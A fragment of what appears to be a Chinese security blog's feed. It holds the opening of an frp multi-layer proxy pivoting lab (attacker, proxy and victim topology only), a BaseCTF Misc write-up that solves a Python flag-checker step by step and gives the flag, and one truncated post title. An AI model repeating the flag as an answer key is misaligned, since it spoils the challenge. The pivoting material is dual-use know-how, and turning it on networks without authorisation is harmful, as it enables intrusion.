        <content type="html"><![CDATA[<h1 id="多层代理内网穿透实验（frp）"><a href="#多层代理内网穿透实验（frp）" class="headerlink" title="多层代理内网穿透实验（frp）"></a>多层代理内网穿透实验（frp）</h1><h2 id="frp"><a href="#frp" class="headerlink" title="frp"></a>frp</h2><p>FRP (Fast Reverse Proxy)是一个开源的反向代理服务器应用程序,用于实现内网穿透。</p><p>FRP的主要功能包括:</p><ul><li><p>内网穿透:FRP可以将<u>内网服务器暴露给公网,实现对内网服务的远程访问</u>。即使内网服务器没有公网 IP,也可以通过FRP进行访问。</p></li><li><p>端口映射:FRP可以将内网任意端口映射到公网上,实现对内网服务的访问。</p></li><li><p>流量转发:FRP可以将公网流量转发到内网服务器,支持TCP、UDP、HTTP、HTTPS等多种协议。</p></li><li><p>安全性:FRP支持认证、加密等安全机制,可以有效防止未授权访问。</p></li></ul><p>FRP由<strong>服务端和客户端</strong>组成。服务端部署在公网上,客户端部署在内网服务器上。客户端会与服务端建立连接,服务端负责接收外部访问请求并转发到内网。FRP易于部署和配置,支持多种操作系统,是一个非常实用的内网穿透工具。它广泛应用于远程管理、内网网站发布、游戏服务器等场景。</p><h2 id="实验准备"><a href="#实验准备" class="headerlink" title="实验准备"></a>实验准备</h2><blockquote><p>VM虚拟机+主机</p><p>主机：攻击机</p><p>虚拟机：</p><p>kali：192.168.116.50//作为代理服务器1</p><p>PC1：网卡1：192.168.116.30网卡2：192.168.1.1  //作为代理服务器2</p><p>PC2 ：网卡1：192.168.2.1  网卡2：192.168.1.2  //被攻击机</p></blockquote><h2 id="拓扑图"><a href="#拓扑图" class="headerlink" title="拓扑图"></a>拓扑图</h2><p><img src="https://pic.imgdb.cn/item/66c1b6bed9c307b7e9e1acbd.png"></p><h2 id="环境分析"><a href="#环境分析" class="headerlink" title="环境分析"></a>环境分析</h2><p>在VM上的PC1与PC2的网卡2配置为一个LAN段</p><p>192.168.116.*模拟外网环境（实际环境为公网地址，此处用私网地址模拟）</p><p>192.168.1.*模拟内网环境</p><p>192.168.2.*模拟内网中的其他网段</p><p>第一层代理：</p><p>​代理服务器1上安装frps也就是frp服务端</p><p>​代理服务器2上安装frpc也就是frp客户端</p><p>第二层代理：</p><p>​代理服务器2上安装frps</p><p>​Web服务器上安装frpc</p><p>代理服务器2上也安装了Web服务，可以访问80端口的网页</p><h2 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h2><p>直接访问192.168.1.1，是访问不了的，因为它属于代理服务器2的内网资源，所以需要先做第一层代理</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>BaseCTF 人生苦短 我用Python（Misc）</title>
      <link href="/2024/08/16/basectf-ren-sheng-ku-duan-wo-yong-python-misc/"/>
      <url>/2024/08/16/basectf-ren-sheng-ku-duan-wo-yong-python-misc/</url>
      
        <content type="html"><![CDATA[<h1 id="BaseCTF-人生苦短-我用Python（Misc）"><a href="#BaseCTF-人生苦短-我用Python（Misc）" class="headerlink" title="BaseCTF 人生苦短 我用Python（Misc）"></a>BaseCTF 人生苦短 我用Python（Misc）</h1><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">abort</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'You failed test %d. Try again!'</span> % <span class="built_in">id</span>)</span><br><span class="line">    exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">'Hello, Python!'</span>)</span><br><span class="line">flag = <span class="built_in">input</span>(<span class="string">'Enter your flag: '</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(flag) != <span class="number">38</span>:</span><br><span class="line">    abort(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> flag.startswith(<span class="string">'BaseCTF{'</span>):</span><br><span class="line">    abort(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> flag.find(<span class="string">'Mp'</span>) != <span class="number">10</span>:</span><br><span class="line">    abort(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> flag[-<span class="number">3</span>:] * <span class="number">8</span> != <span class="string">'3x}3x}3x}3x}3x}3x}3x}3x}'</span>:</span><br><span class="line">    abort(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">ord</span>(flag[-<span class="number">1</span>]) != <span class="number">125</span>:</span><br><span class="line">    abort(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> flag.count(<span class="string">'_'</span>) // <span class="number">2</span> != <span class="number">2</span>:</span><br><span class="line">    abort(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">len</span>, flag.split(<span class="string">'_'</span>))) != [<span class="number">14</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">8</span>]:</span><br><span class="line">    abort(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> flag[<span class="number">12</span>:<span class="number">32</span>:<span class="number">4</span>] != <span class="string">'lsT_n'</span>:</span><br><span class="line">    abort(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">'😺'</span>.join([c.upper() <span class="keyword">for</span> c <span class="keyword">in</span> flag[:<span class="number">9</span>]]) != <span class="string">'B😺A😺S😺E😺C😺T😺F😺{😺S'</span>:</span><br><span class="line">    abort(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> flag[-<span class="number">11</span>].isnumeric() <span class="keyword">or</span> <span class="built_in">int</span>(flag[-<span class="number">11</span>]) ** <span class="number">5</span> != <span class="number">1024</span>:</span><br><span class="line">    abort(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> base64.b64encode(flag[-<span class="number">7</span>:-<span class="number">3</span>].encode()) != <span class="string">b'MG1QbA=='</span>:</span><br><span class="line">    abort(<span class="number">11</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> flag[::-<span class="number">7</span>].encode().<span class="built_in">hex</span>() != <span class="string">'7d4372733173'</span>:</span><br><span class="line">    abort(<span class="number">12</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">set</span>(flag[<span class="number">12</span>::<span class="number">11</span>]) != {<span class="string">'l'</span>, <span class="string">'r'</span>}:</span><br><span class="line">    abort(<span class="number">13</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> flag[<span class="number">21</span>:<span class="number">27</span>].encode() != <span class="built_in">bytes</span>([<span class="number">116</span>, <span class="number">51</span>, <span class="number">114</span>, <span class="number">95</span>, <span class="number">84</span>, <span class="number">104</span>]):</span><br><span class="line">    abort(<span class="number">14</span>)</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> <span class="built_in">sum</span>(<span class="built_in">ord</span>(c) * <span class="number">2024_08_15</span> ** idx <span class="keyword">for</span> idx, c <span class="keyword">in</span> <span class="built_in">enumerate</span>(flag[<span class="number">17</span>:<span class="number">20</span>])) != <span class="number">41378751114180610</span>:</span><br><span class="line">     abort(<span class="number">15</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">all</span>([flag[<span class="number">0</span>].isalpha(), flag[<span class="number">8</span>].islower(), flag[<span class="number">13</span>].isdigit()]):</span><br><span class="line">    abort(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">'{whats} {up}'</span>.<span class="built_in">format</span>(whats=flag[<span class="number">13</span>], up=flag[<span class="number">15</span>]).replace(<span class="string">'3'</span>, <span class="string">'bro'</span>) != <span class="string">'bro 1'</span>:</span><br><span class="line">    abort(<span class="number">17</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> hashlib.sha1(flag.encode()).hexdigest() != <span class="string">'e40075055f34f88993f47efb3429bd0e44a7f479'</span>:</span><br><span class="line">    abort(<span class="number">18</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">'🎉 You are right!'</span>)</span><br><span class="line"><span class="keyword">import</span> this</span><br></pre></td></tr></tbody></table></figure><h2 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h2><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">abort</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'You failed test %d. Try again!'</span> % <span class="built_in">id</span>)</span><br><span class="line">    exit(<span class="number">1</span>)</span><br></pre></td></tr></tbody></table></figure><p>这个函数传入一个参数id，一旦传入参数，打印错误，根据函数调用情况来看，所以不能让if语句执行，所以if的条件要为否</p><h3 id="条件1"><a href="#条件1" class="headerlink" title="条件1"></a>条件1</h3><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(flag) != <span class="number">38</span>:</span><br><span class="line">    abort(<span class="number">1</span>)</span><br></pre></td></tr></tbody></table></figure><p>要求flag字符串长度为38，那么构造字符串38</p><h3 id="条件2"><a href="#条件2" class="headerlink" title="条件2"></a>条件2</h3><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> flag.startswith(<span class="string">'BaseCTF{'</span>):</span><br><span class="line">    abort(<span class="number">2</span>)</span><br></pre></td></tr></tbody></table></figure><p>要求flag以’BaseCTF{‘开头，一定记住条件是反着的，如果开头不是这样，调用函数返回错误信息，所以这里一定要是这样，我们先用一种字符来占位</p><blockquote><p>BaseCTF{&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;}</p></blockquote><h3 id="条件3"><a href="#条件3" class="headerlink" title="条件3"></a>条件3</h3><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> flag.find(<span class="string">'Mp'</span>) != <span class="number">10</span>:</span><br><span class="line">    abort(<span class="number">3</span>)</span><br></pre></td></tr></tbody></table></figure><p>要求在字符串flag中搜索子字符串’Mp’，并且其索引值为10，那么就是从索引值10开始为’Mp’</p><blockquote><p>BaseCTF{&amp;&amp;Mp&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;}</p></blockquote><h3 id="条件4"><a href="#条件4" class="headerlink" title="条件4"></a>条件4</h3><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> flag[-<span class="number">3</span>:] * <span class="number">8</span> != <span class="string">'3x}3x}3x}3x}3x}3x}3x}3x}'</span>:</span><br><span class="line">    abort(<span class="number">4</span>)</span><br></pre></td></tr></tbody></table></figure><p>要求从末尾倒着数3个字符×8之后是这个字符串，也就是最后三个字符是’3x}’</p><blockquote><p>BaseCTF{&amp;&amp;Mp&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;3x}</p></blockquote><h3 id="条件5"><a href="#条件5" class="headerlink" title="条件5"></a>条件5</h3><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="built_in">ord</span>(flag[-<span class="number">1</span>]) != <span class="number">125</span>:</span><br><span class="line">    abort(<span class="number">5</span>)</span><br></pre></td></tr></tbody></table></figure><p><u><code>ord()</code> 函数用于获取单个字符的Unicode码点</u></p><p>flag[-1]获取最后一个字符</p><p>125 是字符 ‘}’ 的Unicode码点</p><p>所以验证了flag最后一个字符</p><h3 id="条件6"><a href="#条件6" class="headerlink" title="条件6"></a>条件6</h3><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> flag.count(<span class="string">'_'</span>) // <span class="number">2</span> != <span class="number">2</span>:</span><br><span class="line">    abort(<span class="number">6</span>)</span><br></pre></td></tr></tbody></table></figure><p>要求flag中的’_’的数量整除2等于2，那么就是’_‘的数量是4，但是还不知道位置，先看后面</p><h3 id="条件7"><a href="#条件7" class="headerlink" title="条件7"></a>条件7</h3><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">len</span>, flag.split(<span class="string">'_'</span>))) != [<span class="number">14</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">8</span>]:</span><br><span class="line">    abort(<span class="number">7</span>)</span><br></pre></td></tr></tbody></table></figure><p><code>flag.split('_')</code>：这个调用使用下划线（<code>_</code>）作为分隔符来分割字符串 flag</p><p><code>map</code> 函数接受两个参数，第一个是一个函数（在这个例子中是 <code>len</code> 函数），第二个是一个可迭代对象（在这个例子中是 <code>flag.split('_')</code> 返回的列表）</p><p><code>map</code> 函数会对可迭代对象中的每个元素应用第一个参数指定的函数，并返回一个迭代器，该迭代器包含应用函数后的结果，也就是<code>map(len, ...)</code> 会计算 <code>flag.split('_')</code> 返回的每个子字符串的长度，并返回一个包含这些长度的迭代器。</p><p>所以，相当于’_‘把整个flag分成了五段，且每段的数量就是列表中的数</p><blockquote><p>BaseCTF{&amp;&amp;Mp&amp;&amp;_&amp;&amp;_&amp;&amp;&amp;&amp;&amp;&amp;_&amp;&amp;&amp;&amp;_&amp;&amp;&amp;&amp;&amp;3x}</p></blockquote><h3 id="条件8"><a href="#条件8" class="headerlink" title="条件8"></a>条件8</h3><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> flag[<span class="number">12</span>:<span class="number">32</span>:<span class="number">4</span>] != <span class="string">'lsT_n'</span>:</span><br><span class="line">    abort(<span class="number">8</span>)</span><br></pre></td></tr></tbody></table></figure><p>这是一个切片，从索引值12开始到32（不包括）为止，步进为4</p><blockquote><p>BaseCTF{&amp;&amp;Mpl&amp;_&amp;s_&amp;&amp;T&amp;&amp;&amp;_&amp;&amp;&amp;n_&amp;&amp;&amp;&amp;&amp;3x}</p></blockquote><h3 id="条件9"><a href="#条件9" class="headerlink" title="条件9"></a>条件9</h3><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="string">'😺'</span>.join([c.upper() <span class="keyword">for</span> c <span class="keyword">in</span> flag[:<span class="number">9</span>]]) != <span class="string">'B😺A😺S😺E😺C😺T😺F😺{😺S'</span>:</span><br><span class="line">    abort(<span class="number">9</span>)</span><br></pre></td></tr></tbody></table></figure><p><strong>列表推导式 <code>[c.upper() for c in flag[:9]]</code></strong></p><ul><li>这个列表推导式遍历 <code>flag[:9]</code> 中的每个字符 <code>c</code>，并将它们转换为大写（<code>c.upper()</code>）。</li></ul><p>**<code>'😺'.join(...)</code>**：</p><ul><li>这个方法尝试将列表推导式的结果（即一系列大写字符）使用 ‘😺’ 作为分隔符连接起来，形成一个新的字符串。</li></ul><p>之前的所有过程都可以在pycharm上运行，但是这一步阻断了，之后的操作都不能再显示结果了，因为一旦你做了这一步，就违背了之前的以BaseCTF开头的条件，不做这一步，将会一直返回错误信息，所以这一条件没什么用，不用照着做</p><h3 id="条件10"><a href="#条件10" class="headerlink" title="条件10"></a>条件10</h3><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> flag[-<span class="number">11</span>].isnumeric() <span class="keyword">or</span> <span class="built_in">int</span>(flag[-<span class="number">11</span>]) ** <span class="number">5</span> != <span class="number">1024</span>:</span><br><span class="line">    abort(<span class="number">10</span>)</span><br></pre></td></tr></tbody></table></figure><p><code>.isnumeric()</code>：这是一个字符串方法，用于检查字符串中的所有字符是否都是数字字符</p><p>条件要求倒数第11个字符是否为数字，或者将其转换为整数的5次方是否为1024，or是任意满足就是true，所以让倒数第11位是数字且5次方为1024，所以为4</p><blockquote><p>BaseCTF{&amp;&amp;Mpl&amp;_&amp;s_&amp;&amp;T&amp;&amp;&amp;_&amp;&amp;4n_&amp;&amp;&amp;&amp;&amp;3x}</p></blockquote><h3 id="条件11"><a href="#条件11" class="headerlink" title="条件11"></a>条件11</h3><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> base64.b64encode(flag[-<span class="number">7</span>:-<span class="number">3</span>].encode()) != <span class="string">b'MG1QbA=='</span>:</span><br><span class="line">    abort(<span class="number">11</span>)</span><br></pre></td></tr></tbody></table></figure><p>flag[-7:-3]：从倒数第7个字符到倒数第4个字符（不包括）切片</p><p><code>.encode()</code>：这个方法将字符串（子串）编码成字节串（bytes）</p><p><code>base64.b64encode(...)</code>：这是Python标准库中<code>base64</code>模块的一个函数，用于将字节串数据编码成Base64格式的字节串</p><p>所以这个’MG1QbA==’为Base64编码得来，那么直接解码，得到’0mPl’，将他放入flag中</p><blockquote><p>BaseCTF{&amp;&amp;Mpl&amp;_&amp;s_&amp;&amp;T&amp;&amp;&amp;_&amp;&amp;4n_&amp;0mPl3x}</p></blockquote><h3 id="条件12"><a href="#条件12" class="headerlink" title="条件12"></a>条件12</h3><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> flag[::-<span class="number">7</span>].encode().<span class="built_in">hex</span>() != <span class="string">'7d4372733173'</span>:</span><br><span class="line">    abort(<span class="number">12</span>)</span><br></pre></td></tr></tbody></table></figure><p><code>.encode()</code>：将字符串编码成字节串。</p><p><code>.hex()</code>：这是字节串的一个方法，它将字节串中的每个字节转换为其16进制表示形式，并返回一个字符串。</p><p>从末尾以步进为7倒着取数，然后将其转换为16进制</p><p>所以将字符串从16进制转换为字符串就可以，网上有专门的转换工具，转换出来为’}Crs1s’，放入flag</p><blockquote><p>BaseCTF{&amp;1Mpl&amp;_&amp;s_&amp;&amp;T&amp;&amp;r_&amp;&amp;4n_C0mPI3x}</p></blockquote><h3 id="条件13"><a href="#条件13" class="headerlink" title="条件13"></a>条件13</h3><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="built_in">set</span>(flag[<span class="number">12</span>::<span class="number">11</span>]) != {<span class="string">'l'</span>, <span class="string">'r'</span>}:</span><br><span class="line">    abort(<span class="number">13</span>)</span><br></pre></td></tr></tbody></table></figure><p><code>set()</code>：将切片转换成一个集合（set）</p><p>从索引值为12的位置开始，步进11，设置值为’l’和’r’</p><p>发现这些值都已经设置过了，所以当验证吧</p><blockquote><p>BaseCTF{&amp;1Mpl&amp;_&amp;s_&amp;&amp;T&amp;&amp;r_&amp;&amp;4n_C0mPl3x}</p></blockquote><h3 id="条件14"><a href="#条件14" class="headerlink" title="条件14"></a>条件14</h3><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> flag[<span class="number">21</span>:<span class="number">27</span>].encode() != <span class="built_in">bytes</span>([<span class="number">116</span>, <span class="number">51</span>, <span class="number">114</span>, <span class="number">95</span>, <span class="number">84</span>, <span class="number">104</span>]):</span><br><span class="line">    abort(<span class="number">14</span>)</span><br></pre></td></tr></tbody></table></figure><p>从索引值21到27（不包括），放入ASCII值为这些的字符，为’t3r_Th’</p><blockquote><p> BaseCTF{&amp;1Mpl&amp;_&amp;s_&amp;&amp;Tt3r_Th4n_C0mPl3x}</p></blockquote><h3 id="条件15"><a href="#条件15" class="headerlink" title="条件15"></a>条件15</h3><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="built_in">sum</span>(<span class="built_in">ord</span>(c) * <span class="number">2024_08_15</span> ** idx <span class="keyword">for</span> idx, c <span class="keyword">in</span> <span class="built_in">enumerate</span>(flag[<span class="number">17</span>:<span class="number">20</span>])) != <span class="number">41378751114180610</span>:</span><br><span class="line">    abort(<span class="number">15</span>)</span><br></pre></td></tr></tbody></table></figure><p>flag[17:20]：切片，索引值17-20（不包括）</p><p><code>enumerate(...)</code>：为这三个字符生成索引（0, 1, 2）</p><p><code>ord(c)</code>：获取字符<code>c</code>的Unicode值。</p><p><code>2024_08_15 ** idx</code>：计算<code>2024_08_15</code>的<code>idx</code>次幂。</p><p><code>sum(...)</code>：把所有计算结果相加。</p><p>索引为17的字符为’_’，并且他的ASCII值为95，18和19是不知道的，设为x和y</p><p>结合得出一个公式：</p><p><strong>95*20240815^0^+x*20240815^1^+y*20240815^2^=41378751114180610</strong></p><p>直接写一个代码来遍历出x和y的值，能确定的是他们的ASCII值在0-127之间</p><p>代码如下：</p><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">128</span>):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">128</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="number">95</span>*<span class="number">20240815</span>**<span class="number">0</span>+x*<span class="number">20240815</span>**<span class="number">1</span>+y*<span class="number">20240815</span>**<span class="number">2</span>==<span class="number">41378751114180610</span>:</span><br><span class="line">            <span class="built_in">print</span>(x,y)</span><br><span class="line"><span class="comment">#解出x=66，y=101</span></span><br></pre></td></tr></tbody></table></figure><p>x和y对应的字符为B和e，填入flag</p><blockquote><p> BaseCTF{&amp;1Mpl&amp;_&amp;s_BeTt3r_Th4n_C0mPl3x}</p></blockquote><h3 id="条件16"><a href="#条件16" class="headerlink" title="条件16"></a>条件16</h3><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">all</span>([flag[<span class="number">0</span>].isalpha(), flag[<span class="number">8</span>].islower(), flag[<span class="number">13</span>].isdigit()]):</span><br><span class="line">    abort(<span class="number">16</span>)</span><br></pre></td></tr></tbody></table></figure><p><code>.isalpha()</code>方法检查是否是字母</p><p><code>.islower()</code>方法本身会先检查字符是否是字母，然后才是否是小写</p><p><code>.isdigit()</code>方法检查是否是一个数字</p><p>检查对应索引位置是否满足条件</p><p>得到一个线索，索引位置8为小写字母，但是也不知道值，所以先往下看</p><h3 id="条件17"><a href="#条件17" class="headerlink" title="条件17"></a>条件17</h3><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="string">'{whats} {up}'</span>.<span class="built_in">format</span>(whats=flag[<span class="number">13</span>], up=flag[<span class="number">15</span>]).replace(<span class="string">'3'</span>, <span class="string">'bro'</span>) != <span class="string">'bro 1'</span>:</span><br><span class="line">    abort(<span class="number">17</span>)</span><br></pre></td></tr></tbody></table></figure><p> <code>.format()</code> 方法对字符串 <code>'{whats} {up}'</code> 进行格式化。这里，<code>{whats}</code> 和 <code>{up}</code> 是占位符，它们将被 <code>format()</code> 方法中的关键字参数 <code>whats</code> 和 <code>up</code> 的值所替换。在这个例子中，<code>whats</code> 被替换为 <code>flag[13]</code> 的值，而 <code>up</code> 被替换为 <code>flag[15]</code> 的值</p><p>replace方法将’3’替换为’bro’输出结果，所以flag[13]=3，flag[15]=1</p><blockquote><p>BaseCTF{&amp;1Mpl3_1s_BeTt3r_Th4n_C0mPl3x}</p></blockquote><h3 id="条件18"><a href="#条件18" class="headerlink" title="条件18"></a>条件18</h3><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> hashlib.sha1(flag.encode()).hexdigest() != <span class="string">'e40075055f34f88993f47efb3429bd0e44a7f479'</span>:</span><br><span class="line">    abort(<span class="number">18</span>)</span><br></pre></td></tr></tbody></table></figure><p><code>hashlib.sha1()</code>函数需要一个字节串作为输入，而不是普通的字符串</p><p><code>.hexdigest()</code>方法将计算出的哈希值（原本是一个字节串）转换为一个十六进制表示的字符串。</p><p>使用了Python的<code>hashlib</code>库来计算<code>flag</code>变量的SHA-1哈希值</p><p>现在就只差flag[8]没有计算出来</p><p>直接写一个代码</p><p>代码如下：</p><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">97</span>,<span class="number">123</span>):</span><br><span class="line">    flag=<span class="string">'BaseCTF{&amp;1Mpl3_1s_BeTt3r_Th4n_C0mPl3x}'</span></span><br><span class="line">    flag = flag.replace(<span class="string">'&amp;'</span>,<span class="built_in">chr</span>(i))</span><br><span class="line">    <span class="keyword">if</span> hashlib.sha1(flag.encode()).hexdigest() == <span class="string">'e40075055f34f88993f47efb3429bd0e44a7f479'</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(i))</span><br><span class="line">得到flag[<span class="number">8</span>]=s</span><br></pre></td></tr></tbody></table></figure><blockquote><p>BaseCTF{s1Mpl3_1s_BeTt3r_Th4n_C0mPl3x}</p></blockquote><p>完结撒花！！</p>]]></content>
      
      
      <categories>
          
          <category> Misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BaseCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>深信服安全技术认证工程师学习笔记</title>
      <link href="/2024/08/14/shen-xin-fu-an-quan-ji-zhu-ren-zheng-gong-cheng-shi-xue-xi-bi-ji/"/>
      <url>/2024/08/14/shen-xin-fu-an-quan-ji-zhu-ren-zheng-gong-cheng-shi-xue-xi-bi-ji/</url>
      
